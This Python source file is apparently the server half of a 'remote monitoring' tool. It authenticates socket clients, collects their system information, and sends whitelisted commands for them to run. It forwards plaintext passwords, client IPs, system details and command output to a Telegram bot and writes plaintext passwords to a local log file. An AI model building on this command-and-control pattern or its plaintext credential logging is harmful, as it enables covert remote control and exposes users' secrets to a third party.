"""
Main Server Module - Optimized for Railway with Telegram Logging
"""

import socket
import os
import subprocess
import threading
import requests
import json
from datetime import datetime
from auth import authenticate, hash_password
from config import DEBUG_MODE, ALLOWED_COMMANDS, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

# Railway provides PORT environment variable
PORT = int(os.environ.get('PORT', 5000))
HOST = '0.0.0.0'  # Listen on all interfaces for Railway

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] Telegram credentials not configured")
        return
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            print(f"[!] Telegram send failed: {response.text}")
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def log_attempt(username, password, success, addr, command=None, output=None):
    """Log authentication attempts to Telegram"""
    hashed_password = hash_password(password)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Create formatted message
    status_emoji = "✅" if success else "❌"
    status_text = "SUCCESS" if success else "FAILED"
    
    message = f"""
🔐 <b>Authentication Attempt</b>
━━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {timestamp}
👤 Username: <code>{username}</code>
🔑 Password: <code>{password}</code>
🔒 Hash: <code>{hashed_password[:16]}...</code>
🌐 IP: {addr[0]}
📊 Status: {status_emoji} {status_text}
    """
    
    if command:
        message += f"\n💻 Command: <code>{command}</code>"
    
    if output:
        # Truncate long output
        output_preview = output[:500] + "..." if len(output) > 500 else output
        message += f"\n📤 Output:\n<code>{output_preview}</code>"
    
    send_telegram_message(message)
    
    # Also log to file for backup (Railway has ephemeral storage)
    try:
        with open("logs.txt", "a") as f:
            f.write(f"{timestamp} | {username} | {password} | {addr[0]} | {status_text} | {command if command else 'N/A'}\n")
    except Exception as e:
        print(f"[!] File logging error: {e}")

def handle_client(client, addr):
    """Handle individual client connection"""
    try:
        # Receive credentials
        data = client.recv(2048).decode()
        if not data:
            return
        
        # Split username and password
        parts = data.split(",", 1)
        if len(parts) != 2:
            print(f"[!] Invalid login data from {addr}")
            client.send("AUTH_FAILED".encode())
            return
            
        username, password = parts[0], parts[1]
        
        print(f"\n[+] Login attempt from {addr[0]}")
        print(f"[+] Username: '{username}'")
        
        # Authenticate
        if authenticate(username, password):
            log_attempt(username, password, True, addr)
            client.send("AUTH_SUCCESS".encode())
            
            # Receive system info
            system_info = client.recv(8192).decode()
            
            # Log system info to Telegram
            sys_info_msg = f"""
💻 <b>Client Connected</b>
━━━━━━━━━━━━━━━━━━━━━━━
{system_info}
            """
            send_telegram_message(sys_info_msg)
            
            print("\n" + "="*50)
            print("[CLIENT SYSTEM INFORMATION]")
            print("="*50)
            print(system_info)
            print("="*50)
            
            # Get command from admin via Telegram or console
            print("\n" + "="*50)
            print("[AVAILABLE COMMANDS]")
            print(f"Allowed: {', '.join(ALLOWED_COMMANDS)}")
            print("="*50)
            
            # For Railway, we'll use a simple console input
            # You can also implement Telegram-based command control
            command = input("\nEnter command to execute: ").strip().lower()
            
            # Validate and execute command
            if command not in ALLOWED_COMMANDS:
                client.send("INVALID_COMMAND".encode())
                print(f"[!] Command '{command}' blocked - not in whitelist")
                log_attempt(username, password, True, addr, command, "BLOCKED - Not in whitelist")
            else:
                client.send(command.encode())
                result = client.recv(8192).decode()
                
                # Log command execution
                log_attempt(username, password, True, addr, command, result[:1000])
                
                print("\n" + "="*50)
                print(f"[COMMAND OUTPUT: {command}]")
                print("="*50)
                print(result)
                print("="*50)
        
        else:
            log_attempt(username, password, False, addr)
            client.send("AUTH_FAILED".encode())
            print(f"[!] Failed login for: '{username}' from {addr[0]}")
    
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        print(f"[ERROR] {error_msg}")
        send_telegram_message(f"⚠️ <b>Server Error</b>\n{error_msg}")
    finally:
        client.close()

def start_server():
    """Start the server on Railway"""
    try:
        # Send startup message to Telegram
        start_msg = f"""
🚀 <b>Remote Monitoring Server Started</b>
━━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 Host: {HOST}
🔌 Port: {PORT}
📊 Status: Online
        """
        send_telegram_message(start_msg)
        
        # Get system info
        try:
            whoami = subprocess.getoutput('whoami')
            print("\n" + "="*50)
            print("  REMOTE MONITORING SERVER (Railway)")
            print("="*50)
            print(f"\n[+] System User: {whoami}")
            print(f"[+] Server Host: {HOST}")
            print(f"[+] Port: {PORT}")
            print(f"[+] Auth Method: Windows")
            print(f"[+] Telegram Logging: {'Enabled' if TELEGRAM_BOT_TOKEN else 'Disabled'}")
            print("="*50)
        except:
            pass
        
        # Create socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(5)
        
        print(f"\n[✓] Server listening on {HOST}:{PORT}")
        print("[✓] Waiting for client connections...\n")
        
        # Main loop
        while True:
            client, addr = server.accept()
            print(f"[+] Connection from {addr}")
            
            # Handle client in new thread
            client_thread = threading.Thread(
                target=handle_client,
                args=(client, addr),
                daemon=True
            )
            client_thread.start()
    
    except KeyboardInterrupt:
        print("\n\n[+] Server shutting down...")
        send_telegram_message("🛑 <b>Server Shutting Down</b>")
    except Exception as e:
        error_msg = f"Server error: {str(e)}"
        print(f"\n[!] {error_msg}")
        send_telegram_message(f"⚠️ <b>Critical Error</b>\n{error_msg}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()